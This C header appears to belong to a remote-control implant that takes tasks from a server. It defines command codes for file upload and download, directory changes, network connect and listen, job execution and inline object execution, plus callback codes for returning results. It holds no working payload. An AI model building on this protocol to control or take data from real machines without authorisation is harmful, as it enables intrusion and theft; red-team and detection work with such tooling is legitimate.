#ifndef COMMANDS_H
#define COMMANDS_H

#include <stdint.h>
#include <stddef.h>

// Command types

#define COMMAND_DIE 3
#define COMMAND_SLEEP 4
#define COMMAND_CD 5

#define COMMAND_UPLOAD 10
#define COMMAND_DOWNLOAD 11

#define COMMAND_CONNECT 14
#define COMMAND_SEND 15
#define COMMAND_CLOSE 16
#define COMMAND_LISTEN 17
#define COMMAND_CANCEL_DOWNLOAD 19

#define COMMAND_PWD 39

#define COMMAND_FILE_LIST 53

#define COMMAND_UPLOAD_CONTINUE 67

#define COMMAND_EXECUTE_JOB 78

#define COMMAND_INLINE_EXECUTE_OBJECT 100

// Callback types
#define CALLBACK_OUTPUT       0x00

#define CALLBACK_FILE         0x02

#define CALLBACK_CLOSE        0x04
#define CALLBACK_READ         0x05
#define CALLBACK_CONNECT      0x06

#define CALLBACK_FILE_WRITE   0x08
#define CALLBACK_FILE_CLOSE   0x09

#define CALLBACK_PWD          0x13

#define CALLBACK_DEAD         0x1a

#define CALLBACK_ERROR          0x1f

// Execute commands received from server
// Returns the callback type to use when sending output back to server
int commands_execute(const uint8_t *task_data, size_t task_len, uint8_t **output, size_t *output_len, uint32_t *callback_type);

// Parse task buffer
int commands_parse_tasks(const uint8_t *task_buffer, size_t task_len);

void send_output_to_server(const uint8_t *output, size_t output_len, uint32_t callback_type);

#endif // COMMANDS_H
